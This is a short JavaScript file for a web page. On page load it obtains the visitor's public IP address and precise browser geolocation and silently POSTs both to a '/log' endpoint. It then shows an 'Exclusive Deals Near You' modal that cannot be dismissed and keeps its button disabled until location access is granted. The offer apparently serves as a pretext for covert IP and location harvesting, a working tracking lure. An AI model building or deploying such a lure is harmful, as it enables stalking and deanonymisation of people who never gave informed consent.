async function getIPAddress() {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.log("Error fetching IP address:", error);
    }
}

function getGeolocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    resolve({ latitude, longitude });
                },
                (error) => {
                    console.error("Error getting geolocation:", error);
                    reject(error);
                }
            );
        } else {
            console.log("Geolocation is not supported by this browser.");
            reject("Geolocation not supported.");
        }
    });
}

async function initial() {
    const ip = await getIPAddress();
    try {
        const geolocation = await getGeolocation(); // Requests location **before** alert
        const data = { ip: ip, geolocation: geolocation };

        console.log("Data to be sent:", data);

        fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        });

        showSwal(true); // Shows alert with button enabled
    } catch (error) {
        console.log("Error fetching geolocation:", error);
        showSwal(false); // Shows alert but keeps button disabled
    }
}

function showSwal(locationEnabled) {
    Swal.fire({
        title: "Unlock Exclusive Deals Near You! 🔥",
        text: "Enable location access to get personalized offers for your region.",
        icon: "info",
        allowOutsideClick: false,
        allowEscapeKey: false,
        confirmButtonText: locationEnabled ? "OK" : "Enable Location",
        confirmButtonColor: "#3085d6",
        didOpen: () => {
            const confirmButton = Swal.getConfirmButton();
            confirmButton.disabled = !locationEnabled; // Enable if location was accessed
        },
    });
}

window.onload = initial;
